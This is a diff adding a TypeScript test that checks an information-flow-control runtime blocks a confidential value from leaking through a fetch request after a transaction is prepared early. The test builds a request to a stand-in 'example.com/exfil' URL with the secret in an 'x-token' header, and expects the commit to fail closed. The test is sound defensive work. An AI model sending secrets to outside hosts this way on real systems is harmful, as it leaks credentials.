@@ -205,6 +205,53 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     }
   });
 
+  it("fails closed on a direct commit() when the gated read and request are added after an early prepare", async () => {
+    // Codex P2 on #4070: a transaction prepared early (here on empty content,
+    // status `prepared`, relevant=false) then handed a schema-less confidential
+    // read and a gated sink-request has those additions flip `prepare` to
+    // `invalidated` while `relevant` stays false. A caller that commits through
+    // the ExtendedStorageTransaction.commit() chokepoint DIRECTLY (no
+    // prepareTxForCommit) must still mark relevance in the `invalidated` state,
+    // or the enforcement reject is skipped and the request flushes fail-open.
+    // This exercises commit()'s own probe — note there is no prepareTxForCommit
+    // call below, unlike the other cases.
+    await seedConfidentialCell(runtime, "late-add-secret");
+
+    const tx = runtime.edit();
+    // Prepare early, before any confidential read or sink request exists.
+    tx.prepareCfc();
+    expect(tx.getCfcState().prepare.status).toBe("prepared");
+
+    const secret = runtime.getCell(space, "late-add-secret", undefined, tx);
+    const token = secret.key("secret").getRaw() as string;
+    expect(token).toBe("rosebud");
+    // The post-prepare read/record path invalidated the digest but left the
+    // transaction non-relevant (the read bypassed the ifc gate).
+    expect(tx.getCfcState().relevant).toBe(false);
+
+    let released = false;
+    enqueueSinkRequestPostCommitEffect(
+      tx,
+      "fetchData",
+      "fetchData:late-add",
+      createFrozenRequestSnapshot({
+        url: "https://example.com/exfil",
+        options: { headers: { "x-token": token } },
+      }),
+      "fetchData-start",
+      () => {
+        released = true;
+      },
+    );
+    expect(tx.getCfcState().prepare.status).toBe("invalidated");
+
+    // Direct commit() — the chokepoint Codex's finding is about.
+    const result = await tx.commit();
+
+    expect(released).toBe(false);
+    expect(result.error).toBeDefined();
+  });
+
   it("never fires a fetchData pattern request carrying a labeled header (end-to-end)", async () => {
     setPatternEnvironment({
       apiUrl: new URL("http://mock-test-server.local"),
